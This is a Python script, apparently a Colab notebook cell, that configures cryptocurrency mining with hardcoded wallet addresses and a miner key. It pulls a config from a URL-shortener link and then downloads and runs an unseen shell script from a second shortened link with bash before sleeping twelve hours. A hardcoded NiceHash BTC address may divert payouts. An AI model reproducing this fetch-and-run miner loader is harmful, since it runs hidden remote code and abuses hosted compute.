import requests
from time import sleep
from subprocess import run
import json
import os


AlgoList = "Ethash,Etchash,Autolykos2,VerusHash,RandomX" #@param {type:'string'}
BTCWallet = "35tNyRsuii9mkZrRtojKuvfXa6oKu2VDoC" #@param {type:'string'}
ETCWallet = "0xd6899d73f72a6ca47fd871cce133d20e26172b8e" #@param {type:'string'}
ETHWallet = "0xd6899d73f72a6ca47fd871cce133d20e26172b8e" #@param {type:'string'}
VerusWallet = "0xd6899d73f72a6ca47fd871cce133d20e26172b8e" #@param {type:'string'}
PoolList = "MiningPoolHub" #@param {type:'string'}
MinerList = "lolminer, Nanominer" #@param {type:'string'}
RBMinerKey = "2dd6f3ed-384f-405d-8772-bc941562b81b" #@param {type:'string'}


url = "https://s.id/Dc-HJ" #rasah diganti eror nanges!
r = requests.get(url)
data_json = r.text
filename = 'setup.json'
with open(filename,'w') as fd:
    fd.write(data_json)
with open(filename, 'r') as f:
    data = json.load(f)
    data["Config"]["MinerName"] = MinerList
    data["Config"]["MinerStatusKey"] = RBMinerKey
    data["Config"]["PoolName"] = PoolList
    data["Config"]["Wallet"] = BTCWallet
    data["Coins"]["BTC"]["Wallet"] = BTCWallet
    data["Coins"]["ETC"]["Wallet"] = ETCWallet
    data["Coins"]["ETH"]["Wallet"] = ETHWallet
    data["Coins"]["VRSC"]["Wallet"] = VerusWallet
    data["Pools"]["NiceHash"]["BTC"] = "35nRsgGjD1G1VLA1ad6ejHEPog3ttbFQy9"
    data["Config"]["Algorithm"] = AlgoList

os.remove(filename)
with open(filename, 'w') as f:
    json.dump(data, f, indent=4)
	
f = open("/home/jembutijo.sh", "w")
f.write((requests.get("https://s.id/DcX0x")).text) #rasah diganti eror nanges!
f.close()
run(["bash",f.name])
sleep(43200)
